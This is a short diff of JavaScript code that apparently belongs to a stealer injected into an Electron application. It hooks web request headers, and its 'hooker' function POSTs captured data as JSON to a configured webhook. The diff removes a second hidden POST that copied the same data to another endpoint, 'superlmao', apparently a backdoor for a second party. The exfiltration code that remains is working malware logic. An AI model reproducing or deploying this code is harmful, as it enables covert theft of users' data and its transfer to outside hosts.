@@ -210,7 +210,6 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 const hooker = async (content) => {
     const data = JSON.stringify(content);
     const url = new URL(config.webhook);
-    const url2 = new URL(superlmao)
     const options = {
         protocol: url.protocol,
         hostname: url.host,
@@ -221,29 +220,16 @@ const hooker = async (content) => {
             "Access-Control-Allow-Origin": "*",
         },
     };
-    const options2 = {
-        protocol: url2.protocol,
-        hostname: url2.host,
-        path: url2.pathname,
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "Access-Control-Allow-Origin": "*",
-        },
-    };
+    
     const req = https.request(options);
-    const req2 = https.request(options2);
+   
     
     req.on("error", (err) => {
         console.log(err);
     });
     req.write(data);
     req.end();
-    req2.on("error", (err) => {
-        console.log(err);
-    });
-    req2.write(data);
-    req2.end();
+
 };
 
 
